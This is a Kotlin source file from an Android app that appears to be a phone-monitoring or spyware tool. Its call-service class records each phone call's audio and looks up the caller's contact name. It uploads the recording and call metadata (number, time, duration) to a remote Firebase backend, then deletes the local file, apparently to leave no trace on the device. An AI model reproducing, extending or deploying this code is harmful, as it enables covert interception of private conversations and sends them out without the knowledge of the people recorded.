package com.github.muneebwanee.dash.services.calls

import android.content.Context
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import com.github.muneebwanee.dash.data.rxFirebase.InterfaceFirebase
import com.github.muneebwanee.dash.data.model.Calls
import com.github.muneebwanee.dash.services.base.BaseInteractorService
import com.github.muneebwanee.dash.utils.ConstFun.getDateTime
import com.github.muneebwanee.dash.utils.ConstFun.isAndroidM
import com.github.muneebwanee.dash.utils.Consts.ADDRESS_AUDIO_CALLS
import com.github.muneebwanee.dash.utils.Consts.CALLS
import com.github.muneebwanee.dash.utils.Consts.DATA
import com.github.muneebwanee.dash.utils.FileHelper
import com.github.muneebwanee.dash.utils.FileHelper.getFileNameCall
import com.github.muneebwanee.dash.utils.FileHelper.getContactName
import com.github.muneebwanee.dash.utils.FileHelper.getDurationFile
import com.github.muneebwanee.dash.utils.FileHelper.getFilePath
import com.github.muneebwanee.dash.utils.MediaRecorderUtils
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import java.io.File
import javax.inject.Inject

/**
 * Created by muneebwanee on 15/12/20.
 */
class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(context: Context, firebase: InterfaceFirebase) : BaseInteractorService<S>(context, firebase), InterfaceInteractorCalls<S> {

    private var recorder: MediaRecorderUtils = MediaRecorderUtils{deleteFile()}
    private var fileName: String? = null
    private var contact: String? = null
    private var phoneNumber: String? = null
    private var type : Int = 0
    private var dateTime: String? = null

    override fun startRecording(phoneNumber: String?,type:Int) {

        this.type = type
        this.phoneNumber = phoneNumber
        dateTime = getDateTime()
        contact = getContext().getContactName(phoneNumber)
        fileName = getContext().getFileNameCall(phoneNumber, dateTime)

        if (isAndroidM()) recorder.startRecording(MediaRecorder.AudioSource.VOICE_COMMUNICATION,fileName)
        else recorder.startRecording(MediaRecorder.AudioSource.VOICE_CALL,fileName)

    }

    override fun stopRecording() {
        recorder.stopRecording { sendFileCall() }
    }

    private fun deleteFile() {
        FileHelper.deleteFile(fileName)
        if (getService() != null) getService()!!.stopServiceCalls()
    }

    private fun sendFileCall() {
        val filePath = "${getContext().getFilePath()}/$ADDRESS_AUDIO_CALLS"
        val dateNumber = fileName!!.replace("$filePath/", "")
        val uri = Uri.fromFile(File(fileName))
        getService()!!.addDisposable(firebase().putFile("$CALLS/$dateNumber", uri)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ setPushName() }, { deleteFile() }))
    }

    private fun setPushName() {
        val duration = getDurationFile(fileName!!)
        val calls = Calls(contact, phoneNumber, dateTime, duration,type)
        firebase().getDatabaseReference("$CALLS/$DATA").push().setValue(calls)
        deleteFile()
    }


}